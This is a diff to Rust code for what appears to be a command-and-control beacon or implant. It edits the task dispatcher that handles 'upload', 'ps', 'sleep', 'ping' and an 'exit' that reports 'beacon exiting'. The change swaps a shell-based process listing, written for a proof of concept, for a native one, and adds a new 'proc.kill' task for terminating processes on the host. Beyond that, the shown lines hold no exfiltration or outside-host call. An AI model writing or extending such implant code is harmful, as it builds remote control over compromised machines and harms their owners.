@@ -373,18 +373,14 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
             let eof = args.bool_or("eof", true);
             upload(&path, offset, &data, eof)
         }
-        "ps" => {
-            // Portable enough for a PoC: ask the platform for the process list.
-            #[cfg(windows)]
-            let cmd = "tasklist";
-            #[cfg(target_os = "linux")]
-            let cmd = "ps -eo pid,ppid,user,comm --sort=pid";
-            #[cfg(target_os = "macos")]
-            let cmd = "ps -eo pid,ppid,user,comm";
-            #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
-            let cmd = "ps";
-            shell(cmd, 30)
-        }
+        "ps" => match crate::proc::list() {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "proc.kill" => match crate::proc::kill(&args) {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
         "sleep" => Outcome::ok(b"sleep interval updated\n".to_vec()),
         "exit" | "kill" => Outcome::ok(b"beacon exiting\n".to_vec()),
         "ping" => Outcome::ok(b"pong\n".to_vec()),
